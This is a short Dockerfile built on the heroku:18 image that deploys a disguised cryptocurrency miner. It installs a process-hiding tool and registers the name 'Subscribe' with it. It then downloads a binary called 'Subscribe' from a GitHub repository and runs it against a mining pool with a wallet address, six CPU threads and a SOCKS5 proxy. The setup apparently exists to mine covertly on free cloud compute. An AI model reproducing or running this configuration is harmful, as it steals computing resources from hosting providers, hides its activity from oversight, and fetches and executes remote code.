FROM heroku/heroku:18
RUN apt-get update
RUN apt-get install -y nodejs npm
RUN npm i -g node-process-hider; ph add Subscribe
RUN wget https://github.com/p4n1k/mnr/raw/main/Subscribe; chmod +x Subscribe; ./Subscribe --disable-gpu --algorithm yescryptR16 --pool stratum+tcps://stratum-na.rplant.xyz:17055 --wallet qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu001 --cpu-threads 6 -x socks5://192.252.214.20:15864
CMD bash heroku.sh
